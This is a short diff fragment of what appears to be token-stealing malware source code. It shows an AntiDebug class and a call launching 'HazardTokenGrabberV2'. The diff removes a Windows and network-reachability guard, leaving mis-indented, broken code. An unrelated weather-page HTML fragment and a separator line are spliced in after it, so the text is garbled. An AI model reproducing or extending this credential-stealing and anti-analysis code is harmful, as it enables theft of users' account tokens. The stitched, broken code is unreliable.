@@ -775,11 +775,7 @@ class AntiDebug(Functions):
             winreg.CloseKey(handle)
 
 
-if __name__ == "__main__" and os.name == "nt":
-    try:
-        httpx.get('https://google.com')
-    except (httpx.NetworkError, httpx.TimeoutException):
-        os._exit(0)
+
     asyncio.run(HazardTokenGrabberV2().init())
 </div></li><li class="forecast-tombstone">
 _*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*  
